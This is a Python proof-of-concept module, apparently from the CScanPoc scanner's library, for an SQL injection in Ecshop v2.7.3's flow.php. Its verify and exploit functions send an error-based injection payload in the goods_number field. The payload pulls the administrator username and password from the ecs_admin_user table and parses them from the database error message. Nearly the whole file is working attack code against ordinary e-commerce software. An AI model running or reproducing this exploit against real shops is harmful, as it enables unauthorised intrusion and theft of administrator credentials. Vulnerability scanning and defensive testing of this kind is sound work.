# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0003_p'  # 平台漏洞编号，留空
    name = 'Ecshop v2.7.3 /flow.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-02-09'  # 漏洞公布时间
    desc = '''
        Ecshop v2.7.3 中的flow.php文件代码缺陷，导致SQL注入漏洞。  
    '''  # 漏洞描述
    ref = 'https://www.waitalone.cn/ec-shop-bulk-injection-exp.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = 'v2.7.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd8591e9a-1386-4ab7-bb3c-c69820d17308'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '{target}'.format(
                target=self.target) + "/flow.php?step=update_cart"
            postDataExp = ("goods_number%5B1%27+and+%28select+1+from%28select+count%28*%29%2Cconcat"
                           "%28%28select+%28select+%28SELECT+concat%28user_name%2C0x7c%2Cpassword%29+"
                           "FROM+ecs_admin_user+limit+0%2C1%29%29+from+information_schema.tables+limit"
                           "+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+"
                           "group+by+x%29a%29+and+1%3D1+%23%5D=1&submit=exp")

            req = urllib.request.Request(url=verify_url, data=postDataExp)
            response = urllib.request.urlopen(req, timeout=10)
            content = str(response.read())
            pattern = re.compile(
                r".*Duplicate\s*entry\s*'(?P<username>[\w]+)\|(?P<password>[\w]+)", re.I | re.S)
            match = pattern.match(content)

            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(
                target=self.target)+"/flow.php?step=update_cart"
            postDataExp = ("goods_number%5B1%27+and+%28select+1+from%28select+count%28*%29%2Cconcat"
                           "%28%28select+%28select+%28SELECT+concat%28user_name%2C0x7c%2Cpassword%29+"
                           "FROM+ecs_admin_user+limit+0%2C1%29%29+from+information_schema.tables+limit"
                           "+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+"
                           "group+by+x%29a%29+and+1%3D1+%23%5D=1&submit=exp")

            req = urllib.request.Request(url=verify_url, data=postDataExp)
            response = urllib.request.urlopen(req, timeout=10)
            content = str(response.read())
            pattern = re.compile(
                r".*Duplicate\s*entry\s*'(?P<username>[\w]+)\|(?P<password>[\w]+)", re.I | re.S)
            match = pattern.match(content)
            if match:
                username = match.group("username")
                password = match.group("password")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
